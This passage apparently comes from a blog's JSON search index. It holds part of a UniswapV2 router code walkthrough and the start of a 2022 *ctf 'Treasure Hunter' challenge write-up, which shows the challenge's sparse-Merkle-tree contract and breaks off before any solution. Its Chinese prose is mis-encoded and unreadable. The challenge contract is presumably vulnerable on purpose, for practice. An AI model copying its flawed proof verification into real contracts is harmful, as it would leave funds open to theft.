amountBï¼Œæœ€åŽæ£€éªŒæ˜¯å¦æ»¡è¶³æ»‘ç‚¹è®¡ç®—åŽçš„æœ€å°å€¼.\nremoveLiquidityETH åŒç†ï¼Œå› ä¸ºpairå®žé™…å­˜å‚¨çš„æ˜¯WETHï¼Œæ‰€ä»¥è°ƒç”¨removeLiquidity æ—¶ç¬¬äºŒä¸ªå‚æ•°ä¸ºwETHï¼Œå…¶ä½™é€»è¾‘ç›¸åŒï¼Œæœ€åŽè°ƒç”¨WETHçš„withdrawå‡½æ•°å°†WETHè½¬å˜ä¸ºETHï¼Œåœ¨è°ƒç”¨safeTransferETHå°†EThè½¬ç»™toåœ°å€\nremoveLiquidityWithPermitå‡½æ•°å®žé™…å°±æ˜¯åœ¨è°ƒç”¨removeLiquidityå‡½æ•°é’±å…ˆè°ƒç”¨permitå‡½æ•°è¿›è¡ŒæŽˆæƒï¼Œä»Žè€Œå…åŽ»è°ƒç”¨approveå‡½æ•°çš„æ“ä½œï¼Œé€»è¾‘åŒä¸Š\nremoveLiquidityETHWithPermitå‡½æ•°å’ŒremoveLiquidityETH åŒç†ï¼ŒåŒºåˆ«äºŽä¹Ÿæ·»åŠ äº†è°ƒç”¨permitå‡½æ•°ä½¿ç”¨ç­¾åè¿›è¡ŒæŽˆæƒçš„æ“ä½œï¼Œä»Žè€Œæ¢å›žToken+ETH\nremoveLiquidityETHSupportingFeeOnTransferTokenså’ŒremoveLiquidityETHWithPermitSupportingFeeOnTransferTokenså‡½æ•°è¿™é‡Œæ”¾åœ¨ä¸€èµ·è¿›è¡Œåˆ†æžé€»è¾‘ä¸Žä¹‹å‰çš„removeLiquidityETH å’ŒremoveLiquidityWithPermitæ˜¯ä¸€æ ·çš„ï¼Œå‰è€…éœ€è¦æå‰è¿›è¡Œapproveï¼ŒåŽè€…ä½¿ç”¨permitè¿›è¡Œç­¾åéªŒè¯åŽè°ƒç”¨å‰è€…\nä»£å¸å…‘æ¢ï¼š\nfunction _swap(uint[] memory amounts, address[] memory path, address _to) internal virtual &#123;\n        for (uint i; i &lt; path.length - 1; i++) &#123;\n            (address input, address output) = (path[i], path[i + 1]);\n            (address token0,) = UniswapV2Library.sortTokens(input, output);\n            uint amountOut = amounts[i + 1];\n            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0));\n            address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;\n            IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)).swap(\n                amount0Out, amount1Out, to, new bytes(0)\n            );\n        &#125;\n    &#125;\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123;\n        amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, to);\n    &#125;\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint[] memory amounts) &#123;\n        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n        require(amounts[0] &lt;= amountInMax, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, to);\n    &#125;\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        payable\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    &#123;\n        require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsOut(factory, msg.value, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        IWETH(WETH).deposit&#123;value: amounts[0]&#125;();\n        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]));\n        _swap(amounts, path, to);\n    &#125;\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    &#123;\n        require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n        require(amounts[0] &lt;= amountInMax, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, address(this));\n        IWETH(WETH).withdraw(amounts[amounts.length - 1]);\n        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);\n    &#125;\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    &#123;\n        require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, address(this));\n        IWETH(WETH).withdraw(amounts[amounts.length - 1]);\n        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);\n    &#125;\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        virtual\n        override\n        payable\n        ensure(deadline)\n        returns (uint[] memory amounts)\n    &#123;\n        require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n        amounts = UniswapV2Library.getAmountsIn(factory, amountOut, path);\n        require(amounts[0] &lt;= msg.value, 'UniswapV2Router: EXCESSIVE_INPUT_AMOUNT');\n        IWETH(WETH).deposit&#123;value: amounts[0]&#125;();\n        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]));\n        _swap(amounts, path, to);\n        // refund dust eth, if any\n        if (msg.value > amounts[0]) TransferHelper.safeTransferETH(msg.sender, msg.value - amounts[0]);\n    &#125;\n\n    // **** SWAP (supporting fee-on-transfer tokens) ****\n    // requires the initial amount to have already been sent to the first pair\n    function _swapSupportingFeeOnTransferTokens(address[] memory path, address _to) internal virtual &#123;\n        for (uint i; i &lt; path.length - 1; i++) &#123;\n            (address input, address output) = (path[i], path[i + 1]);\n            (address token0,) = UniswapV2Library.sortTokens(input, output);\n            IUniswapV2Pair pair = IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output));\n            uint amountInput;\n            uint amountOutput;\n            &#123; // scope to avoid stack too deep errors\n            (uint reserve0, uint reserve1,) = pair.getReserves();\n            (uint reserveInput, uint reserveOutput) = input == token0 ? (reserve0, reserve1) : (reserve1, reserve0);\n            amountInput = IERC20(input).balanceOf(address(pair)).sub(reserveInput);\n            amountOutput = UniswapV2Library.getAmountOut(amountInput, reserveInput, reserveOutput);\n            &#125;\n            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOutput) : (amountOutput, uint(0));\n            address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;\n            pair.swap(amount0Out, amount1Out, to, new bytes(0));\n        &#125;\n    &#125;\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) &#123;\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn\n        );\n        uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);\n        _swapSupportingFeeOnTransferTokens(path, to);\n        require(\n            IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,\n            'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'\n        );\n    &#125;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    )\n        external\n        virtual\n        override\n        payable\n        ensure(deadline)\n    &#123;\n        require(path[0] == WETH, 'UniswapV2Router: INVALID_PATH');\n        uint amountIn = msg.value;\n        IWETH(WETH).deposit&#123;value: amountIn&#125;();\n        assert(IWETH(WETH).transfer(UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn));\n        uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);\n        _swapSupportingFeeOnTransferTokens(path, to);\n        require(\n            IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,\n            'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT'\n        );\n    &#125;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    )\n        external\n        virtual\n        override\n        ensure(deadline)\n    &#123;\n        require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn\n        );\n        _swapSupportingFeeOnTransferTokens(path, address(this));\n        uint amountOut = IERC20(WETH).balanceOf(address(this));\n        require(amountOut >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        IWETH(WETH).withdraw(amountOut);\n        TransferHelper.safeTransferETH(to, amountOut);\n    &#125;\n\n\nå‡½æ•°æ³¨è§£ï¼š\ncommon Token\nswapExactTokensForTokensï¼šç”¨æŒ‡å®šæ•°é‡çš„TokenAå…‘æ¢æœªç¡®å®šæ•°é‡çš„TokenB\nswapTokensForExactTokensï¼šç”¨æœªç¡®å®šæ•°é‡çš„TokenAæ¢å–ç¡®å®šæ•°é‡çš„TokenB\nswapExactETHForTokensï¼šç”¨æŒ‡å®šæ•°é‡çš„çš„ETHå…‘æ¢ERC20 Token\nswapTokensForExactETHï¼šç”¨æœªæŒ‡å®šæ•°é‡çš„Tokenæ¢å–æŒ‡å®šæ•°é‡çš„ETH\nswapExactTokensForETHï¼šç”¨æŒ‡å®šæ•°é‡çš„Tokenå…‘æ¢å›žæœªæŒ‡å®šæ•°é‡çš„ETH\nswapETHForExactTokensï¼šç”¨æœªæŒ‡å®šæ•°é‡çš„ETHå…‘æ¢æŒ‡å®šæ•°é‡çš„Token\nfee on transfer Token\nswapExactTokensForTokensSupportingFeeOnTransferTokensï¼šæŒ‡å®šæ•°é‡çš„Tokenå…‘æ¢Tokenï¼Œæ”¯æŒè½¬è´¦æ—¶æ‰£è´¹\nswapExactETHForTokensSupportingFeeOnTransferTokensï¼šï¼šæŒ‡å®šæ•°é‡çš„ETHå…‘æ¢Tokenï¼Œæ”¯æŒè½¬è´¦æ—¶æ‰£è´¹\nswapExactTokensForETHSupportingFeeOnTransferTokensï¼šæŒ‡å®šæ•°é‡çš„Tokenå…‘æ¢ ETHï¼Œæ”¯æŒè½¬è´¦æ—¶æ‰£è´¹\næ ¸å¿ƒä»£ç ï¼š\nfunction _swap(uint[] memory amounts, address[] memory path, address _to) internal virtual &#123;\n    for (uint i; i &lt; path.length - 1; i++) &#123;\n        (address input, address output) = (path[i], path[i + 1]);\n        (address token0,) = UniswapV2Library.sortTokens(input, output);\n        uint amountOut = amounts[i + 1];\n        (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0));\n        address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;\n        IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output)).swap(\n            amount0Out, amount1Out, to, new bytes(0)\n        );\n    &#125;\n&#125;\n\néåŽ†æ•´ä¸ªå…‘æ¢è·¯å¾„ï¼Œpath[i]ä¸ºinp Tokenï¼Œpath[i+1]ä¸ºoutput Tokenï¼Œåœ¨è¿›è¡Œamountçš„åŒ¹é…ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºæœ€åŽä¸€æ¬¡å…‘æ¢ï¼Œæ˜¯åˆ™toä¸ºä¸º_toï¼Œå¦åˆ™toä¸ºä¸‹ä¸€ä¸ªå…‘æ¢åŒ¹é…çš„pairåˆçº¦åœ°å€ï¼Œæœ€åŽè°ƒç”¨pairåˆçº¦ä¸‹çš„swapå‡½æ•°å®žçŽ°å…‘æ¢\nswapExactTokensForTokenså‡½æ•°é¦–å…ˆè®¡ç®—å‡ºå…‘æ¢æ•°é‡åœ¨åˆ¤æ–­æ˜¯å¦ä½ŽäºŽæ»‘ç‚¹è®¡ç®—åŽçš„æœ€å°å€¼ï¼Œå¤§äºŽæœ€å°å€¼å°±å°†Tokenè½¬ç§»åˆ°pairåˆçº¦å¹¶å¸¦å“¦ç”¨å†…éƒ¨swapå‡½æ•°ã€‚swapTokensForExactTokenså‡½æ•°åŒç†ï¼Œå…ˆè®¡ç®—å‡ºå…‘æ¢éœ€è¦èŠ±è´¹çš„æ•°é‡ï¼Œåœ¨åˆ¤æ–­å°äºŽæœ€å¤§å€¼ï¼Œå†è½¬è´¦åˆ°pairåˆçº¦åŽè¿›è¡Œswap\nswapExactETHForTokenså’ŒswapExactTokensForTokenså‡½æ•°é€»è¾‘ç›¸åŒï¼Œåªæ˜¯å°†amountInæ¢æˆäº†msg.valueè®¡ç®—amountOutï¼Œå¹¶ä¸”å¤šäº†ä¸€æ­¥å°†EThå­˜å‚¨ä¸ºWETHçš„è¿‡ç¨‹ï¼Œå…¶ä½™é€»è¾‘ä¸€æ ·ã€‚swapTokensForExactETHå‡½æ•°å’ŒswapTokensForExactTokensé€»è¾‘ç›¸åŒï¼Œä¸åŒç‚¹åŒä¸Š\nå‰©ä½™çš„å‡ ä¸ªé€»è¾‘ä¹Ÿéƒ½ä¸€æ ·ï¼Œå°±ä¸å†å±•å¼€è¯´äº†\nå†çœ‹ä¸€ä¸‹fee on transferçš„Tokençš„swapåŽŸç†ï¼Œæ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š\nfunction _swapSupportingFeeOnTransferTokens(address[] memory path, address _to) internal virtual &#123;\n    for (uint i; i &lt; path.length - 1; i++) &#123;\n        (address input, address output) = (path[i], path[i + 1]);\n        (address token0,) = UniswapV2Library.sortTokens(input, output);\n        IUniswapV2Pair pair = IUniswapV2Pair(UniswapV2Library.pairFor(factory, input, output));\n        uint amountInput;\n        uint amountOutput;\n        &#123; // scope to avoid stack too deep errors\n        (uint reserve0, uint reserve1,) = pair.getReserves();\n        (uint reserveInput, uint reserveOutput) = input == token0 ? (reserve0, reserve1) : (reserve1, reserve0);\n        amountInput = IERC20(input).balanceOf(address(pair)).sub(reserveInput);\n        amountOutput = UniswapV2Library.getAmountOut(amountInput, reserveInput, reserveOutput);\n        &#125;\n        (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOutput) : (amountOutput, uint(0));\n        address to = i &lt; path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;\n        pair.swap(amount0Out, amount1Out, to, new bytes(0));\n    &#125;\n&#125;\n\næ ¸å¿ƒä»£ç é‡Œè¾¹éœ€è¦æ³¨æ„ä¸€ä¸‹amountInputå’ŒamountOutputçš„è®¡ç®—ï¼Œå› ä¸ºTokenå¯èƒ½åœ¨è½¬è´¦çš„è¿‡ç¨‹ä¸­è¿›è¡Œäº†æ‰‹ç»­è´¹çš„æ‰£é™¤ï¼Œæ‰€ä»¥amountInä½¿ç”¨åˆçº¦ä½™é¢å‡åŽ»å‚¨å¤‡é‡‘çš„æ–¹æ³•è®¡ç®—ï¼Œå†ä¾æ®amountInè®¡ç®—amountOutï¼Œå…¶ä½™é€»è¾‘åŒä¸Š\nå…¶ä½™ä¸‰ä¸ªè¿›è¡Œå…‘æ¢çš„å‡½æ•°é™¤äº†æ˜¯è¿™æ ·è®¡ç®—amountï¼Œå…¶ä½™é€»è¾‘æ²¡æœ‰ä¸åŒï¼Œç›¸åŒçš„swapåŽŸç†ï¼Œè¿™é‡Œä¸å†ç»†è¯´äº†\næœ€åŽæ˜¯äº”ä¸ªæŸ¥è¯¢å‡½æ•°ï¼Œå¯¹åº”ç€UniswapV2Libraryåº“å†…çš„å‡½æ•°\nfunction quote(uint amountA, uint reserveA, uint reserveB) public pure virtual override returns (uint amountB) &#123;\n    return UniswapV2Library.quote(amountA, reserveA, reserveB);\n&#125;\n\nfunction getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)\n    public\n    pure\n    virtual\n    override\n    returns (uint amountOut)\n&#123;\n    return UniswapV2Library.getAmountOut(amountIn, reserveIn, reserveOut);\n&#125;\n\nfunction getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)\n    public\n    pure\n    virtual\n    override\n    returns (uint amountIn)\n&#123;\n    return UniswapV2Library.getAmountIn(amountOut, reserveIn, reserveOut);\n&#125;\n\nfunction getAmountsOut(uint amountIn, address[] memory path)\n    public\n    view\n    virtual\n    override\n    returns (uint[] memory amounts)\n&#123;\n    return UniswapV2Library.getAmountsOut(factory, amountIn, path);\n&#125;\n\nfunction getAmountsIn(uint amountOut, address[] memory path)\n    public\n    view\n    virtual\n    override\n    returns (uint[] memory amounts)\n&#123;\n    return UniswapV2Library.getAmountsIn(factory, amountOut, path);\n&#125;\n\n","slug":"UniswapV2","date":"2022-08-01T10:44:56.839Z","categories_index":"","tags_index":"åŒºå—é“¾ ctf","author_index":"bcYng"},{"id":"de2cba75e8e35434333862362c47f8f7","title":"2022 *ctf-->Treasure Hunter","content":"å‘¨å…­æ—¶å€™æ‰“äº†ä¸€ä¸‹*ctfï¼Œå…¶ä¸­çš„åŒºå—é“¾é¢˜ç›®è¿˜æ˜¯è›®æœ‰æ„æ€çš„ï¼Œæ‹¿å‡ºæ¥åˆ†äº«ä¸€ä¸‹\n\n\ncodepragma solidity >=0.8.0 &lt;0.9.0;\n\nuint256 constant SMT_STACK_SIZE = 32;\nuint256 constant DEPTH = 160;\n\nlibrary SMT &#123;\n    struct Leaf &#123;\n        address key;\n        uint8 value;\n    &#125;\n\n    enum Mode &#123;\n        BlackList,\n        WhiteList\n    &#125;\n\n    enum Method &#123;\n        Insert,\n        Delete\n    &#125;\n\n    function init() internal pure returns (bytes32) &#123;\n        return 0;\n    &#125;\n\n    function calcLeaf(Leaf memory a) internal pure returns (bytes32) &#123;\n        if (a.value == 0) &#123;\n            return 0;\n        &#125; else &#123;\n            return keccak256(abi.encode(a.key, a.value));\n        &#125;\n    &#125;\n\n    function merge(bytes32 l, bytes32 r) internal pure returns (bytes32) &#123;\n        if (l == 0) &#123;\n            return r;\n        &#125; else if (r == 0) &#123;\n            return l;\n        &#125; else &#123;\n            return keccak256(abi.encode(l, r));\n        &#125;\n    &#125;\n\n    function verifyByMode(\n        bytes32[] memory _proofs,\n        address[] memory _targets,\n        bytes32 _expectedRoot,\n        Mode _mode\n    ) internal pure returns (bool) &#123;\n        Leaf[] memory leaves = new Leaf[](_targets.length);\n        for (uint256 i = 0; i &lt; _targets.length; i++) &#123;\n            leaves[i] = Leaf(&#123;key: _targets[i], value: uint8(_mode)&#125;);\n        &#125;\n        return verify(_proofs, leaves, _expectedRoot);\n    &#125;\n\n    function verify(\n        bytes32[] memory _proofs,\n        Leaf[] memory _leaves,\n        bytes32 _expectedRoot\n    ) internal pure returns (bool) &#123;\n        return (calcRoot(_proofs, _leaves, _expectedRoot) == _expectedRoot);\n    &#125;\n\n    function updateSingleTarget(\n        bytes32[] memory _proofs,\n        address _target,\n        bytes32 _prevRoot,\n        Method _method\n    ) internal pure returns (bytes32) &#123;\n        Leaf[] memory nextLeaves = new Leaf[](1);\n        Leaf[] memory prevLeaves = new Leaf[](1);\n        nextLeaves[0] = Leaf(&#123;key: _target, value: uint8(_method) ^ 1&#125;);\n        prevLeaves[0] = Leaf(&#123;key: _target, value: uint8(_method)&#125;);\n        return update(_proofs, nextLeaves, prevLeaves, _prevRoot);\n    &#125;\n    function unpdateTargets(\n        bytes32[] memory _proofs,\n        address[] memory _targets,\n        bytes32 _prevRoot,\n        Method _method\n    ) internal pure returns (bytes32)&#123;\n        Leaf[] memory nextLeaves = new Leaf[](_targets.length);\n        Leaf[] memory prevLeaves = new Leaf[](_targets.length);\n\n        for(uint256 i = 0;i&lt;_targets.length;i++)&#123;\n            nextLeaves[i] = Leaf(&#123;key: _targets[i], value: uint8(_method) ^ 1&#125;);\n            prevLeaves[i] = Leaf(&#123;key: _targets[i], value: uint8(_method)&#125;);\n        &#125;\n        return update(_proofs, nextLeaves, prevLeaves, _prevRoot);\n    &#125;\n    function update(\n        bytes32[] memory _proofs,\n        Leaf[] memory _nextLeaves,\n        Leaf[] memory _prevLeaves,\n        bytes32 _prevRoot\n    ) internal pure returns (bytes32) &#123;\n        require(verify(_proofs, _prevLeaves, _prevRoot), \"update proof not valid\");\n        return calcRoot(_proofs, _nextLeaves, _prevRoot);\n    &#125;\n\n    function checkGroupSorted(Leaf[] memory _leaves) internal pure returns (bool) &#123;\n        require(_leaves.length >= 1);\n        uint160 temp = 0;\n        for (uint256 i = 0; i &lt; _leaves.length; i++) &#123;\n            if (temp >= uint160(_leaves[i].key)) &#123;\n                return false;\n            &#125;\n            temp = uint160(_leaves[i].key);\n        &#125;\n        return true;\n    &#125;\n\n    function getBit(uint160 key, uint256 height) internal pure returns (uint256) &#123;\n        require(height &lt;= DEPTH);\n        return (key >> height) &amp; 1;\n    &#125;\n\n    function parentPath(uint160 key, uint256 height) internal pure returns (uint160) &#123;\n        require(height &lt;= DEPTH);\n        return copyBit(key, height + 1);\n    &#125;\n\n    function copyBit(uint160 key, uint256 height) internal pure returns (uint160) &#123;\n        require(height &lt;= DEPTH);\n        return ((key >> height) &lt;&lt; height);\n    &#125;\n\n    function calcRoot(\n        bytes32[] memory _proofs,\n        Leaf[] memory _leaves,\n        bytes32 _root\n    ) internal pure returns (bytes32) &#123;\n        require(checkGroupSorted(_leaves));\n        uint160[] memory stackKeys = new uint160[](SMT_STACK_SIZE);\n        bytes32[] memory stackValues = new bytes32[](SMT_STACK_SIZE);\n        uint256 proofIndex = 0;\n        uint256 leaveIndex = 0;\n        uint256 stackTop = 0;\n\n        while (proofIndex &lt; _proofs.length) &#123;\n            if (uint256(_proofs[proofIndex]) == 0x4c) &#123;\n                proofIndex++;\n                require(stackTop &lt; SMT_STACK_SIZE,\"1\");\n                require(leaveIndex &lt; _leaves.length,\"2\");\n                stackKeys[stackTop] = uint160(_leaves[leaveIndex].key);\n                stackValues[stackTop] = calcLeaf(_leaves[leaveIndex]);\n                stackTop++;\n                leaveIndex++;\n            &#125; else if (uint256(_proofs[proofIndex]) == 0x50) &#123;\n                proofIndex++;\n                require(stackTop != 0,\"3\");\n                require(proofIndex + 2 &lt;= _proofs.length,\"4\");\n\n                uint256 height = uint256(_proofs[proofIndex++]);\n                bytes32 currentProof = _proofs[proofIndex++];\n                require(currentProof != _root,\"5\");\n                if (getBit(stackKeys[stackTop - 1], height) == 1) &#123;\n                    stackValues[stackTop - 1] = merge(currentProof, stackValues[stackTop - 1]);\n                &#125; else &#123;\n                    stackValues[stackTop - 1] = merge(stackValues[stackTop - 1], currentProof);\n                &#125;\n                stackKeys[stackTop - 1] = parentPath(stackKeys[stackTop - 1], height);\n            &#125; else if (uint256(_proofs[proofIndex]) == 0x48) &#123;\n                proofIndex++;\n                require(stackTop >= 2,\"6\");\n                require(proofIndex &lt; _proofs.length,\"7\");\n                uint256 height = uint256(_proofs[proofIndex++]);\n                uint256 aSet = getBit(stackKeys[stackTop - 2], height);\n                uint256 bSet = getBit(stackKeys[stackTop - 1], height);\n                stackKeys[stackTop - 2] = parentPath(stackKeys[stackTop - 2], height);\n                stackKeys[stackTop - 1] = parentPath(stackKeys[stackTop - 1], height);\n                require(stackKeys[stackTop - 2] == stackKeys[stackTop - 1] &amp;&amp; aSet != bSet,\"8\");\n\n                if (aSet == 1) &#123;\n                    stackValues[stackTop - 2] = merge(\n                        stackValues[stackTop - 1],\n                        stackValues[stackTop - 2]\n                    );\n                &#125; else &#123;\n                    stackValues[stackTop - 2] = merge(\n                        stackValues[stackTop - 2],\n                        stackValues[stackTop - 1]\n                    );\n                &#125;\n                stackTop -= 1;\n            &#125; else &#123;\n                revert();\n            &#125;\n        &#125;\n        require(leaveIndex == _leaves.length,\"9\");\n        require(stackTop == 1,\"10\");\n        return stackValues[0];\n    &#125;\n&#125;\n\n\ncontract TreasureHunter &#123;\n    bytes32 public root;\n    SMT.Mode public smtMode = SMT.Mode.WhiteList;\n    bool public solved = false;\n    address[] team;\n\n    mapping(address => bool) public haveKey;\n    mapping(address => bool) public haveTreasureChest;\n\n    event FindKey(address indexed _from);\n    event PickupTreasureChest(address indexed _from);\n    event OpenTreasureChest(address indexed _from);\n\n    constructor() public &#123;\n        root = SMT.init();\n        _init();\n    &#125;\n\n    function _init() internal &#123;\n        address[] memory hunters = new address[](8);\n        hunters[0] = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;\n        hunters[1] = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;\n        hunters[2] = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n        hunters[3] = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;\n        hunters[4] = 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B;\n        hunters[5] = 0xc00e94Cb662C3520282E6f5717214004A7f26888;\n        hunters[6] = 0xD533a949740bb3306d119CC777fa900bA034cd52;\n        hunters[7] = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n\n        SMT.Leaf[] memory nextLeaves = new SMT.Leaf[](8);\n        SMT.Leaf[] memory prevLeaves = new SMT.Leaf[](8);\n        for (uint8 i = 0; i &lt; hunters.length; i++) &#123;\n            nextLeaves[i] = SMT.Leaf(&#123;key: hunters[i], value: 1&#125;);\n            prevLeaves[i] = SMT.Leaf(&#123;key: hunters[i], value: 0&#125;);\n        &#125;\n\n        bytes32[] memory proof = new bytes32[](22);\n        proof[0] = 0x000000000000000000000000000000000000000000000000000000000000004c;\n        proof[1] = 0x000000000000000000000000000000000000000000000000000000000000004c;\n        proof[2] = 0x000000000000000000000000000000000000000000000000000000000000004c;\n        proof[3] = 0x000000000000000000000000000000000000000000000000000000000000004c;\n        proof[4] = 0x0000000000000000000000000000000000000000000000000000000000000048;\n        proof[5] = 0x0000000000000000000000000000000000000000000000000000000000000095;\n        proof[6] = 0x0000000000000000000000000000000000000000000000000000000000000048;\n        proof[7] = 0x0000000000000000000000000000000000000000000000000000000000000099;\n        proof[8] = 0x0000000000000000000000000000000000000000000000000000000000000048;\n        proof[9] = 0x000000000000000000000000000000000000000000000000000000000000009e;\n        proof[10] = 0x000000000000000000000000000000000000000000000000000000000000004c;\n        proof[11] = 0x000000000000000000000000000000000000000000000000000000000000004c;\n        proof[12] = 0x000000000000000000000000000000000000000000000000000000000000004c;\n        proof[13] = 0x000000000000000000000000000000000000000000000000000000000000004c;\n        proof[14] = 0x0000000000000000000000000000000000000000000000000000000000000048;\n        proof[15] = 0x000000000000000000000000000000000000000000000000000000000000009b;\n        proof[16] = 0x0000000000000000000000000000000000000000000000000000000000000048;\n        proof[17] = 0x000000000000000000000000000000000000000000000000000000000000009c;\n        proof[18] = 0x0000000000000000000000000000000000000000000000000000000000000048;\n        proof[19] = 0x000000000000000000000000000000000000000000000000000000000000009e;\n        proof[20] = 0x0000000000000000000000000000000000000000000000000000000000000048;\n        proof[21] = 0x000000000000000000000000000000000000000000000000000000000000009f;\n\n        root = SMT.update(proof, nextLeaves, prevLeaves, root);\n    &#125;\n    function checkteam() public returns (bool)&#123;\n        for(uint i = 0;i&lt;team.length;i++)&#123;\n            if(team[i] == msg.sender)&#123;\n                return false;\n            &#125;\n        &#125;\n        return true;\n    &#125;\n\n    function removeIndex(uint index) internal returns (address[] memory)&#123;\n        require(index &lt; team.length);\n        for(uint i = index;i&lt;team.length-1;i++)&#123;\n            team[i] = team[i+1];\n        &#125;\n        team.pop();\n        return team;\n    &#125;\n    function enter(bytes32[] memory _proofs) public &#123;\n        require(haveKey[msg.sender] == false);\n        require(checkteam());\n        team.push(msg.sender);\n        root = SMT.updateSingleTarget(_proofs, msg.sender, root, SMT.Method.Insert);\n    &#125;\n\n    function leave(bytes32[] memory _proofs) public &#123;\n        require(haveTreasureChest[msg.sender] == false);\n        for(uint i = 0;i&lt;team.length;i++)&#123;\n            if(team[i] == msg.sender)&#123;\n                team = removeIndex(i);\n            &#125;\n        &#125;\n        root = SMT.updateSingleTarget(_proofs, msg.sender, root, SMT.Method.Delete);\n    &#125;\n\n    function findKey(bytes32[] memory _proofs) public &#123;\n        require(smtMode == SMT.Mode.BlackList, \"not blacklist mode\");\n        require(team.length >= 4);\n        require(SMT.verifyByMode(_proofs, team, root, smtMode), \"hunter has fallen into a trap\");\n        haveKey[msg.sender] = true;\n        smtMode = SMT.Mode.WhiteList;\n        emit FindKey(msg.sender);\n    &#125;\n\n    function pickupTreasureChest(bytes32[] memory _proofs) public &#123;\n        require(smtMode == SMT.Mode.WhiteList, \"not whitelist mode\");\n        require(team.length >= 4);\n        require(\n            SMT.verifyByMode(_proofs, team, root, smtMode),\n            \"hunter hasn't found the treasure 